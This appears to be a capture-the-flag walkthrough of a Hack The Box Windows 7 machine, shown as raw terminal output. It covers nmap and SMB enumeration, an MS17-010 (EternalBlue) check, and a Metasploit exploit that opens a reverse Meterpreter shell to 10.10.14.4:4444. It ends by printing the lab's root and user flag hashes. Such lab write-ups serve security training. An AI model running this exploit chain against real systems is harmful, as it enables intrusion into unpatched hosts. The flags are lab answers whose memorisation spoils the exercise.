
```
└─# nmap -sS -vvv -Pn --min-rate 2000 10.10.10.40                                                              
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
```
```
NSE Timing: About 99.76% done; ETC: 12:36 (0:00:00 remaining)
Nmap scan report for 10.10.10.40
Host is up (0.82s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 4s, median: 0s
| smb2-time: 
|   date: 2023-11-11T12:34:01
|_  start_date: 2023-11-10T16:06:22
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-11-11T12:34:01+00:00
```
```
┌──(root㉿1337)-[/home/bloman/CTFs/Boot2root/HacktheBox]
└─# crackmapexec smb 10.10.10.40 -u 'guest' -p '' --shares 
/usr/lib/python3/dist-packages/paramiko/transport.py:236: CryptographyDeprecationWarning: Blowfish has been deprecated
  "class": algorithms.Blowfish,
SMB         10.10.10.40     445    HARIS-PC         [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)
SMB         10.10.10.40     445    HARIS-PC         [+] haris-PC\guest: 
SMB         10.10.10.40     445    HARIS-PC         [+] Enumerated shares
SMB         10.10.10.40     445    HARIS-PC         Share           Permissions     Remark
SMB         10.10.10.40     445    HARIS-PC         -----           -----------     ------
SMB         10.10.10.40     445    HARIS-PC         ADMIN$                          Remote Admin
SMB         10.10.10.40     445    HARIS-PC         C$                              Default share
SMB         10.10.10.40     445    HARIS-PC         IPC$                            Remote IPC
SMB         10.10.10.40     445    HARIS-PC         Share           READ            
SMB         10.10.10.40     445    HARIS-PC         Users           READ  
```
## Exploit
```
└─# nmap -Pn -p135,445 --script=smb-vuln-ms17-010.nse 10.10.10.40
PORT    STATE SERVICE
135/tcp open  msrpc
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 16.42 seconds
                                                              
```
```
[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] Sending stage (200774 bytes) to 10.10.10.40
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.40:49163) at 2023-11-11 12:46:11 +0000

meterpreter > 
meterpreter > sysinfo 
Computer        : HARIS-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > 

 Directory of C:\Users\Administrator\Desktop

24/12/2017  02:22    <DIR>          .
24/12/2017  02:22    <DIR>          ..
10/11/2023  16:06                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,693,619,712 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
02069349aa9c6860b3b9d4064548781c

C:\Users\Administrator\Desktop>
C:\Users\haris\Desktop>type user.txt
type user.txt
ab4f33f1dfb4395698143697599c994b

C:\Users\haris\Desktop>

```